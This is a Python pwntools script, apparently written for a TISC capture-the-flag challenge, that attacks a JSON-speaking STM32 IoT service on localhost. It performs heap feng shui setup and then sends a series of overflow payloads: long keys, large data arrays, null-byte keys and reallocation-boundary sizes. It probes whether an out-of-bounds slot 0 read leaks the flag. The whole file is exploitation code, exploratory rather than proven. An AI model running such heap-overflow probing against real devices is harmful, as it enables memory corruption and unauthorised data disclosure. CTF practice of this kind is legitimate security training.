#!/usr/bin/env python3

import json
import socket
import time
from pwn import *

def heap_feng_shui_setup(host, port):
    """Set up heap feng shui with slot 1 comparison [69,2,0]"""
    try:
        r = remote(host, port)
        
        # Heap feng shui: start with slot 1 comparison to set up heap layout
        feng_shui_cmd = {"slot": 1, "data": [69, 2, 0]}
        cmd_str = json.dumps(feng_shui_cmd)
        print(f"Heap feng shui setup: {cmd_str}")
        r.sendline(cmd_str.encode())
        response = r.recv()
        print(f"Feng shui response: {response}")
        
        return r
    except Exception as e:
        print(f"Heap feng shui setup failed: {e}")
        return None

def test_precise_overflow_boundaries():
    """Test precise overflow boundaries based on observed behavior"""
    print("=== Testing Precise Overflow Boundaries ===")
    
    # We observed that size 15 gave "Result: 1" which might be significant
    # Let's test around that boundary more precisely
    
    test_sizes = []
    
    # Test around the boundary where behavior changes
    for i in range(10, 25):
        test_sizes.append(i)
        
    # Test around reallocation boundaries (powers of 2 and nearby)
    for base in [16, 32, 64, 128, 256]:
        for offset in [-2, -1, 0, 1, 2]:
            size = base + offset
            if size > 0 and size not in test_sizes:
                test_sizes.append(size)
    
    test_sizes.sort()
    
    for size in test_sizes:
        print(f"\n=== Testing size {size} ===")
        
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            continue
            
        try:
            # Create JSON command with specific key length
            padding_key = "X" * size
            overflow_cmd = {"slot": 1, padding_key: "overflow"}
            
            cmd_str = json.dumps(overflow_cmd)
            print(f"Command length: {len(cmd_str)} bytes")
            print(f"Key length: {size}")
            
            r.sendline(cmd_str.encode())
            response = r.recv(timeout=3)
            print(f"Response: {response}")
            
            # Test slot 0 access immediately after
            print("Testing slot 0...")
            r.sendline(b'{"slot":0}')
            slot0_response = r.recv(timeout=3)
            print(f"Slot 0 response: {slot0_response}")
            
            # Check for success conditions
            if b'TISC{' in slot0_response:
                print(f"SUCCESS! Size {size} enabled slot 0 access!")
                print(f"Flag: {slot0_response}")
                r.close()
                return True
            elif b'Out of bounds!' not in slot0_response:
                print(f"Different behavior at size {size}: {slot0_response}")
                
                # Try a few more slot 0 attempts in case it's intermittent
                for attempt in range(3):
                    print(f"Additional slot 0 attempt {attempt+1}...")
                    r.sendline(b'{"slot":0}')
                    response = r.recv(timeout=2)
                    print(f"Attempt {attempt+1}: {response}")
                    if b'TISC{' in response:
                        print(f"SUCCESS on attempt {attempt+1}!")
                        print(f"Flag: {response}")
                        r.close()
                        return True
            
        except Exception as e:
            print(f"Error at size {size}: {e}")
        finally:
            r.close()
            
        time.sleep(0.2)
    
    return False

def test_json_structure_overflow():
    """Test overflow in JSON structure parsing itself"""
    print("\n=== Testing JSON Structure Overflow ===")
    
    # Try different JSON structures that might trigger different parsing paths
    structures = [
        # Structure 1: Many keys
        {f"key{i}": f"val{i}" for i in range(50)},
        
        # Structure 2: Nested objects
        {"slot": 1, "nested": {"level1": {"level2": {"level3": "deep"}}}},
        
        # Structure 3: Long string values 
        {"slot": 1, "data": "A" * 1000},
        
        # Structure 4: Mix of types
        {"slot": 1, "str": "test", "num": 42, "bool": True, "null": None},
    ]
    
    for i, structure in enumerate(structures):
        print(f"\n--- Testing structure {i+1} ---")
        
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            continue
            
        try:
            cmd_str = json.dumps(structure)
            print(f"Structure size: {len(cmd_str)} bytes")
            
            r.sendline(cmd_str.encode())
            response = r.recv(timeout=3)
            print(f"Response: {response}")
            
            # Test slot 0
            r.sendline(b'{"slot":0}')
            slot0_response = r.recv(timeout=2)
            print(f"Slot 0: {slot0_response}")
            
            if b'TISC{' in slot0_response:
                print(f"SUCCESS with structure {i+1}!")
                print(f"Flag: {slot0_response}")
                r.close()
                return True
                
        except Exception as e:
            print(f"Error with structure {i+1}: {e}")
        finally:
            r.close()
            
        time.sleep(0.1)
    
    return False

def test_data_array_overflow():
    """Test overflow in data array processing specifically"""
    print("\n=== Testing Data Array Overflow ===")
    
    # Focus on the data array which we know uses FUN_08006d04
    array_sizes = [10, 20, 30, 50, 100, 200, 500, 1000]
    
    for size in array_sizes:
        print(f"\n--- Testing array size {size} ---")
        
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            continue
            
        try:
            # Create array with specific pattern
            test_array = []
            for i in range(size):
                # Use pattern that might reveal overflow
                test_array.append(i % 256)
            
            overflow_cmd = {"slot": 1, "data": test_array}
            cmd_str = json.dumps(overflow_cmd)
            
            print(f"Array command size: {len(cmd_str)} bytes")
            r.sendline(cmd_str.encode())
            response = r.recv(timeout=5)
            print(f"Array response: {response}")
            
            # Test slot 0
            r.sendline(b'{"slot":0}')
            slot0_response = r.recv(timeout=2)
            print(f"Slot 0: {slot0_response}")
            
            if b'TISC{' in slot0_response:
                print(f"SUCCESS with array size {size}!")
                print(f"Flag: {slot0_response}")
                r.close()
                return True
            elif b'Out of bounds!' not in slot0_response:
                print(f"Different behavior with array size {size}")
                
        except Exception as e:
            print(f"Error with array size {size}: {e}")
        finally:
            r.close()
            
        time.sleep(0.1)
    
    return False

def test_combined_overflow():
    """Test combination of techniques that might trigger overflow"""
    print("\n=== Testing Combined Overflow Techniques ===")
    
    # Combine multiple potential overflow vectors
    combinations = [
        # Combo 1: Long key + data array
        {"slot": 1, "X" * 64: "padding", "data": [42] * 100},
        
        # Combo 2: Multiple long keys
        {"slot": 1, "A" * 30: "val1", "B" * 30: "val2", "C" * 30: "val3"},
        
        # Combo 3: Long key with special characters
        {"slot": 1, "X" * 63 + "\x00\x01\x02": "trigger"},
        
        # Combo 4: Exact reallocation boundary
        {"slot": 1, "X" * 127: "boundary_test"},
    ]
    
    for i, combo in enumerate(combinations):
        print(f"\n--- Testing combination {i+1} ---")
        
        r = heap_feng_shui_setup('localhost', 8000)
        if not r:
            continue
            
        try:
            cmd_str = json.dumps(combo)
            print(f"Combo size: {len(cmd_str)} bytes")
            
            r.sendline(cmd_str.encode())
            response = r.recv(timeout=3)
            print(f"Combo response: {response}")
            
            # Test slot 0
            r.sendline(b'{"slot":0}')
            slot0_response = r.recv(timeout=2)
            print(f"Slot 0: {slot0_response}")
            
            if b'TISC{' in slot0_response:
                print(f"SUCCESS with combination {i+1}!")
                print(f"Flag: {slot0_response}")
                r.close()
                return True
                
        except Exception as e:
            print(f"Error with combination {i+1}: {e}")
        finally:
            r.close()
            
        time.sleep(0.1)
    
    return False

def main():
    print("Targeted STM32 IoT Heap Exploitation")
    print("Based on observed behavior: different error messages indicate memory corruption")
    
    success = False
    
    if not success:
        success = test_precise_overflow_boundaries()
    
    if not success:
        success = test_json_structure_overflow()
        
    if not success:
        success = test_data_array_overflow()
        
    if not success:
        success = test_combined_overflow()
    
    if success:
        print("\nüéâ EXPLOITATION SUCCESSFUL! Flag extracted from slot 0!")
    else:
        print("\n‚ùå Exploitation unsuccessful. Need deeper analysis of the specific overflow condition.")

if __name__ == "__main__":
    main()